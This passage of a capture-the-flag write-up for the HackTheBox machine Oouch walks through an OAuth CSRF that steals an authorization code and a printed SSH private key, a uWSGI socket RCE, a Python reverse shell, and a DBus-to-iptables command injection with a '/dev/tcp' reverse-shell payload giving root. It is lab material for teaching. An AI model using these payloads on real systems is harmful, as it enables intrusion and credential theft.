GET /oauth/authorize/?client_id=d3VwRo9trmopGfGpiYUsKhkwE674SgAM3wT5A6EQ&response_type=code&redirect_uri=http://10.10.14.6/token&scope=read&allow=Authorize&state= HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Connection: close
Cookie: sessionid=nr57zmuau38o2j89sgbecvg83jyu4px6
Upgrade-Insecure-Requests: 1

```

```

HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://10.10.14.6/token?code=eG2kDsLExEKn8tVtzqERCXwyx7b95U
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie

```

#### CSRF #2

With the GET request above, I can now send this as a link to the admin and have them click on it and redirect to me. I’ll create the following link:

```

<a href="http://authorization.oouch.htb:8000/oauth/authorize/?client_id=d3VwRo9trmopGfGpiYUsKhkwE674SgAM3wT5A6EQ&response_type=code&redirect_uri=http://10.10.14.6/token&scope=read&state=&allow=Authorize">click me</a>

```

About a minute after sending this through the contact form, someone clicks on it from Oouch, and this request comes back:

```

root@kali# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 45972
GET /token?code=9a5Q0yBlx7ONDslRKGlulr6a7i8vOM HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=0wlwoshe5nbpgmgw7357g0a9fgq4xowx;

```

What just happened? I sent a link that when clicked on started the person who clicked in the process of telling the authentication server that they wanted my application to get access to their data on the authorization server, with the request marked in red below. What comes back to my `nc` listener is the client’s browser being redirected to my application with the request marked in green:

[![img](https://0xdfimages.gitlab.io/img/image-20200730181927999.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200730181927999.png)

I did notice that a PHP session cookie was included in that request. This makes no sense to me, but I’ll look at it in [Beyond Root](#unintended-session-hijack).

#### Request Access Token

When the client sends me the `authorization_code`, I can use that to request an `access_token`.

I’ll use `curl` to send the request with the `client_id`, `client_secret`, and `grant_type` from my application (the secret and id are different from the image above because I had to re-register to update this post), the `redirect_uri` , and the `code` (pipped into `jq` to make the result more readable):

```

root@kali# curl http://authorization.oouch.htb:8000/oauth/token/ -d 'client_id=HTGoodnXs4IMOYhJzfss3JmF7m64bQHkoPwZOghy&client_secret=5MUCcGC9TlHJOWqmT2qJjqxKHHIzdGKE8PKqoIOgfhecIUPjoSTnxhWdNWI4BgqLb2yMcnq1N5viFgArgkd6PSWWxfJLPsxYP0kAgAS6AmoF9gNFVO56jymUpcnBYunm&redirect_uri=http://10.10.14.6/token&code=Yv0c6OXDFGhpMJ2nqvDTbMVcOfo3Si&grant_type=authorization_code' | jq .
{
  "access_token": "gm05wp2kDWhSmS3QrZmdEqgvFGoEKD",
  "expires_in": 600,
  "token_type": "Bearer",
  "scope": "read",
  "refresh_token": "lGaAVRyhTybjuiRrF8SVPgiSNXR9Bk"
}

```

It is worth noting the `expires_in` value of ten minutes. I lost some time enumerating the API when the token expired and I didn’t realize it. I can use the `refresh_token` to request a new `access_token` (I’ll leave that as an exercise for the reader).

### SSH as qtc

#### get\_user

I still have the hint about `/api/get_user`, and it makes sense now that I have an `access_token` to access qtc’s data. I was able to find the API pretty easily at `authorization.oouch.htb:8000/api/get_user`. In a browser, it just returns a blank page. In Burp, I see it’s a 403:

```

HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization

```

I can add the `Authorization: Bearer [token]` header, and it works:

```

root@kali# curl -s authorization.oouch.htb:8000/api/get_user -H "Authorization: Bearer gm05wp2kDWhSmS3QrZmdEqgvFGoEKD" | jq .
{
  "username": "qtc",
  "firstname": "",
  "lastname": "",
  "email": "qtc@nonexistend.nonono"
}

```

#### get\_ssh

Obviously this isn’t terribly useful information. I spent a while fuzzing for additional parameters that might return the other information entered into the signup form, the ssh key. Eventually, I tried hitting a different endpoint, `/api/get_ssh`:

```

root@kali# curl -s authorization.oouch.htb:8000/api/get_ssh -H "Authorization: Bearer gm05wp2kDWhSmS3QrZmdEqgvFGoEKD" | jq .
{
  "ssh_server": "consumer.oouch.htb",
  "ssh_user": "qtc",
  "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"
}

```

That’s an ssh key!

### SSH

I can save that key to a file (using `jq -r` to print the raw contents) :

```

root@kali# curl -s authorization.oouch.htb:8000/api/get_ssh -H "Authorization: Bearer LBLemeQIcZZtSgPB0Ax54DpJ1h1vrF" | jq -r '.ssh_key' > id_rsa_oouch_qtc

```

And connect over SSH as qtc:

```

root@kali# ssh -i ~/keys/id_rsa_oouch_qtc qtc@consumer.oouch.htb
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.6
qtc@oouch:~$

```

From here I can grab `user.txt`:

```

qtc@oouch:~$ cat user.txt
d5f8b4e6************************

```

## Shell as qtc on consumer container

### Local Enumeration

In the qtc homedir next to `user.txt` is `.note.txt`:

```

qtc@oouch:~$ cat .note.txt 
Implementing an IPS using DBus and iptables == Genius?

```

That must be what was redirecting to the “Hacking Attempt Detected” page I found earlier. According to [Freedesktop.org](https://www.freedesktop.org/wiki/Software/dbus/):

> DBus is a message bus system, a simple way for applications to talk to one another. In addition to interprocess communication, D-Bus helps coordinate process lifecycle; it makes it simple and reliable to code a “single instance” application or daemon, and to launch applications and daemons on demand when their services are needed.

Reading about DBus, it seems that various applications are configured in files inside `/etc/dbus-1/system.d`. There are five configs present on Oouch:

```

qtc@oouch:~$ find /etc/dbus-1/system.d -type f
/etc/dbus-1/system.d/bluetooth.conf
/etc/dbus-1/system.d/wpa_supplicant.conf
/etc/dbus-1/system.d/org.freedesktop.PackageKit.conf
/etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf
/etc/dbus-1/system.d/htb.oouch.Block.conf

```

The most interesting is the one that’s specific to this box, likely the one referenced by the note:

```

qtc@oouch:~$ cat /etc/dbus-1/system.d/htb.oouch.Block.conf
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>

```

This config file defines the owner of the application to be root, which means that any processes spawned by this application will also be run as root. The config also allows the www-data user to send to it and receive from it.

Looking around the host, there’s no evidence of a www-data user. In fact, the two webservers aren’t directly on this host, but in containers. There is a www-data user on this host, but the web services are being run out of containers, which I can see from the two `docker-proxy` processes I get from `ps auxww`:

```

root      3579  0.0  0.1 474988  7580 ?        Sl   15:47   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000
root      3651  0.0  0.1 474988  7620 ?        Sl   15:47   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.5 -container-port 8000

```

### Network Enumeration

I can do a quick ping sweep to see what hosts live on that subnet:

```

qtc@oouch:~$ for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=0.083 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.103 ms
64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=0.050 ms
64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=0.066 ms

```

I uploaded a [static copy of nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap), and ran some scans:

```

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:10 CET
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.2
Host is up (0.00011s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE                             
22/tcp   open  ssh                                 
5000/tcp open  unknown                             

Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.3
                                                                                                      
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:09 CET                                   
Unable to find nmap-services!  Resorting to /etc/services                                             
Cannot find nmap-payloads. UDP payloads are disabled.                                                 
Nmap scan report for 172.18.0.3                                                                       
Host is up (0.00014s latency).                                                                        
Not shown: 65534 closed ports                                                                         
PORT     STATE SERVICE                             
3306/tcp open  mysql                               

Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.4
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:09 CET
Unable to find nmap-services!  Resorting to /etc/services                                           
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.4
Host is up (0.00013s latency).
Not shown: 65534 closed ports                                                                        
PORT     STATE SERVICE
3306/tcp open  mysql                                                                                 

Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.5

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 19:08 CET
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.5
Host is up (0.000089s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds

```

These IPs will shuffle on each boot, but in my case, there are two MySQL servers (.3 and .4), consumer (.2), and authorization (.5). These match up with the IPs/ports from the `docker-proxy` commands.

### SSH as qtc

Interestingly, consumer is listening on SSH in addition to 5000. There is also a private key in the `/home/qtc/.ssh` that is different than the key I used to connect to this box. It does work to SSH into the container (I don’t have to specify the key, as `ssh` will try all the keys in `~/.ssh`):

```

qtc@oouch:~/.ssh$ ssh qtc@172.18.0.2
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 14 15:10:33 2020 from 172.18.0.1
qtc@aeb4525789d8:~$

```

## Shell as www-data on consumer container

### Enumeration

This container is very bare, other than the the application, which lives in `/code`. There’s a couple interesting things here. First, it’s using uWSGI to glue NGINX to the Python Flask application. I can see the config file:

```

qtc@aeb4525789d8:/code$ cat uwsgi.ini 
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true

```

I’ll also dig into the code itself, but for the next step.

### Exploit

#### Vulnerability

Searching around for `uwsgi exploits` I found [this GitHub](https://github.com/wofeiwo/webcgi-exploits). It lists a Chinese website with a POC for exploiting uWSGI. The basic idea if that if I can write to the uWSGI socket, I can get code execution.

#### Container Limitations

This container is stripped down - It has no `curl`, no `nc`, no `ping`, no `wget`, no text editors (`vi`, `vim`, `nano`, `pico`, `ed`). It does have Python, which is useful. I moved files by base64 encoding them on my host (`base64 -w0 [filename]`), copying the output, and then running `echo "[paste]" | base64 -d > [desired file]`. I could have also used `scp` twice, first to Oouch, then to the container.

To get a shell, I turned a typical Python reverse shell into a `.py` file, and moved it to the container just like above.

```

#!/usr/bin/env python

import os
import pty
import socket
import subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.6",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")

```

I tested it as my current user to verify that it could connect back to my Kali box, and it could.

#### Get RCE

I downloaded `uwsgi_exp.py` from GitHub, uploaded it, and ran it, but it fails.

```

qtc@aeb4525789d8:~$ python /dev/shm/.d.py -m unix -u /tmp/uwsgi.socket -c 'id > /tmp/d'
[*]Sending payload.
Traceback (most recent call last):
  File ".t.py", line 146, in <module>
    main()
  File ".t.py", line 143, in main
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
  File ".t.py", line 110, in curl
    return ask_uwsgi(addr_and_port, mode, var)
  File ".t.py", line 77, in ask_uwsgi
    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
  File ".t.py", line 26, in pack_uwsgi_vars
    pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
  File ".t.py", line 18, in sz
    if sys.version_info[0] == 3: import bytes
ModuleNotFoundError: No module named 'bytes'

```

I opened a Python shell and played with it, and found that without importing `bytes`, it’s already there:

```

qtc@aeb4525789d8:~$ python
Python 3.7.6 (default, Feb  2 2020, 09:11:24) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> h = 'abcd'
>>> bytes.fromhex(h)
b'\xab\xcd'

```

So I edited the code to remove that import line, and re-uploaded it. Now it works (proof of concept, output `id` to a file in `/tmp`):

```

qtc@aeb4525789d8:~$ python /dev/shm/.d.py -u /tmp/uwsgi.socket -c 'id > /tmp/d' -m unix
[*]Sending payload.

qtc@aeb4525789d8:~$ cat /tmp/d 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

#### Shell

Instead of `id`, I’ll run the reverse shell I uploaded:

```

qtc@aeb4525789d8:~$ python /dev/shm/.d.py -m unix -u /tmp/uwsgi.socket -c 'python /dev/shm/.rev.py'
[*]Sending payload.

```

Immediately I get a shell:

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 56614
bash: /root/.bashrc: Permission denied
www-data@aeb4525789d8:/code$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Shell as root on oouch

### Enumeration

The other thing I looked at in the code was how it was doing the WAF to detect XSS attempts. After finding my way through the Flask application, I found the routes in `/code/oouch/routes.py`. At the top of the code, it adds the `dbus` location to the system path before importing the DBus module:

```

sys.path.insert(0, "/usr/lib/python3/dist-packages")
import dbus

```

Further down the file, the route for `/contact` was interesting:

```

primitive_xss = re.compile("(<script|<img|<svg|onload|onclick|onhover|onerror|<iframe|<html|alert|document\.)")
...[snip]...
@app.route('/contact', methods=['GET', 'POST'])
@login_required
def contact():
    '''
    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.                                                                       
    The messages are scanned for valid url's and these urls are saved to a file on disk. A cronjob will view the files regulary and                                                                          
    invoke requests on the corresponding urls.

    Parameters:
        None

    Returns:
        render                (Render)                  Renders the contact page.
    '''
    # First we need to load the contact form
    form = ContactForm()

    # If the form was already submitted, we process the contents
    if form.validate_on_submit():

        # First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')

        # The regex defined at the beginning of this file checks for valid urls
        url = regex.search(form.textfield.data)
        if url:

            # If an url was found, we try to save it to the file /code/urls.txt
            try:
                with open("/code/urls.txt", "a") as url_file:
                    print(url.group(0), file=url_file)
            except:
                print("Error while opening 'urls.txt'")

        # In any case, we inform the user that has message has been sent
        return render_template('contact.html', title='Contact', send=True, form=form)

    # Except the functions goes up to here. In this case, no form was submitted and we do not need to inform the user
    return render_template('contact.html', title='Contact', send=False, form=form)

```

In the middle of that route, it checks the input data against the `primitive_xss` search, and if it matches, it uses `dbus` to send the client IP and then closes the connection, returning the Hacker page.

I know when this happens, I’m blocked from communicating with Oouch for a minute, and the note earlier suggested it was via IP tables.

### Exploit

I’m going to hypothesize that the dbus server is receiving IPs and running an `iptables` command to block it, and that I might be able to do command injection if it is not handling that input correctly.

I opened a local Python shell and used the commands in the web-app as a template. `import dbus` fails, until I set the path like in the app, and then it works:

```

www-data@aeb4525789d8:/code$ python
Python 3.7.6 (default, Feb  2 2020, 09:11:24) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import dbus
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ModuleNotFoundError: No module named 'dbus'
>>> import sys                                          
>>> sys.path.insert(0, "/usr/lib/python3/dist-packages")
>>> import dbus

```

Now I’ll create a `bus` object, and set the interface.

```

>>> bus = dbus.SystemBus()
>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

```

For a payload, I’ll see if I can just append a `ping`:

```

>>> client_ip = '; ping -c 1 10.10.14.6 #'

```

With `tcpdump` listening, I’ll submit it:

```

>>> response = block_iface.Block(client_ip)
>>> response
dbus.String('Carried out :D')
>>> bus.close()

```

As soon as I sent the first command above, `tcpdump` got a hit:

```

root@kali# tcpdump -i tun0 icmp                                       
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
11:24:08.919117 IP 10.10.10.177 > 10.10.14.6: ICMP echo request, id 4646, seq 1, length 64
11:24:08.919140 IP 10.10.14.6 > 10.10.10.177: ICMP echo reply, id 4646, seq 1, length 64  

```

It also worked with the command in `$()`. Now I’ll try a real payload:

```

>>> bus = dbus.SystemBus()                                                      
>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')        
>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
>>> client_ip = '; bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" #'
>>> response = block_iface.Block(client_ip)                                     
>>> bus.close()

```

On submitting, I get a root shell on Oouch:

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 51146
bash: cannot set terminal process group (2419): Inappropriate ioctl for device
bash: no job control in this shell
root@oouch:/root# id
uid=0(root) gid=0(root) groups=0(root)

```

And I can grab `root.txt`:

```

root@oouch:/root# cat root.txt
b8371f67************************

```

## Beyond Root

### dbus + iptables

I saw how in the web code it send IPs over dbus. As root, I can see how they are used. In `/root`, there’s `dbus-server`, and it’s source, `dbus-server.c`:

```

root@oouch:/root# ls
credits.txt  dbus-server  dbus-server.c  get_pwnd.log  get_pwnd.py  root.txt

```

Looking at the source, this table tells the bus how to handle incoming messages:

```

/* The vtable of our little object, implements the net.poettering.Calculator interface */             
static const sd_bus_vtable block_vtable[] = {                                                         
        SD_BUS_VTABLE_START(0),   
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),                   
        SD_BUS_VTABLE_END                                                                             
};     

```

The “Block” dbus method should go to `method_block`. This function will pull out the message, read it into `host`. Then it uses `sprintf` to put the host into a string to form the `iptables` command:

```

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) { 
        char* host = NULL;  
        int r;

        /* Read the parameters */                                                                     
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {                  
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r)); 
                return r;   
        }                                                                                             
                                                                                                      
        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";    
                                                                                                      
        int command_len = strlen(command);
        int host_len = strlen(host);                                                                  
                                                                                                      
        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));               
        if(command_buffer == NULL) {               
                fprintf(stderr, "Failed to allocate memory\n");                                       
                return -1;                                                                                                                                                                                   
        }                       
                                                   
        sprintf(command_buffer, command, host);
                                                   
        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang  
         * forever if some user spawns a shell. Therefore we need to fork (easier than implementing real 
         * multithreading)                                                                            
         */        
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occurred. We simply send a generic message.  
             * In the first implementation we returned separate error messages for success or failure. 
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}

```

At the end, it calls fork, and in the child process, calls `system` on the `iptables` command string it built earlier.

I can also see in the root crontab that there’s a cron to clear the PREROUTING table every minute, removing the blocks:

```

root@oouch:/root# crontab -l
* * * * * /root/get_pwnd.py > /root/get_pwnd.log  2>&1
* * * * * /usr/sbin/iptables -F PREROUTING -t mangle

```

### Unintended Session Hijack

For some reason, when qtc’s browser got the redirect from the authorization server back to my malicious app, the automation decided to include qtc’s session cookie for the authorization server. It makes no sense that this cookie is there, cookies for authorization.oouch.htb should not be sent to any other website, including 10.10.14.6. But it is, and I can use the Firefox dev tools, in the Storage tab, to change the `sessionid` cookie to the one I just got back:

![image-20200311070031416](https://0xdfimages.gitlab.io/img/image-20200311070031416.png)

On refreshing the page, I’m now logged in as qtc:

![image-20200311070056176](https://0xdfimages.gitlab.io/img/image-20200311070056176.png)

There’s not much here to do.

I did take a quick look at the automation as root, but I didn’t have time to figure out why the cookie was being sent.